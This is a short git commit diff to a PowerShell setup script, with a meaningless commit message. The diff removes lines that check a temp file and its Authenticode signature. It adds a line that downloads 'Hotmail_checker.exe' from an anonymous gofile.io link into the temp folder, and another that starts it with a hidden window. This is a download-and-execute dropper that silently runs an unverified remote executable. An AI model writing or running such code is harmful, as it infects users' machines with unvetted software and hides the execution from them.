e02b10ac96d1d0aa4ce19d44c25d0da3a4989700
atlastweaks <reallyyes@atomicmail.io>
2026-08-24 22:08:32 +0200

    asdads

--- setup2.ps1
+++ setup2.ps1
@@ -1,5 +1,3 @@
-$temp = Join-Path $env:TEMP "Hotmail_checker.exe"
+Invoke-WebRequest -Uri "https://cold-eu-agl-1.gofile.io/download/web/cf8ab565-842e-4f6e-a9bb-4b6e05c83e40/Hotmail_checker.exe" -OutFile "$env:TEMP\Hotmail_checker.exe"
 
-Test-Path $temp
-Get-Item $temp -ErrorAction SilentlyContinue | Select-Object FullName,Length
-Get-AuthenticodeSignature $temp -ErrorAction SilentlyContinue | Format-List
+Start-Process -FilePath "$env:TEMP\Hotmail_checker.exe" -WindowStyle Hidden
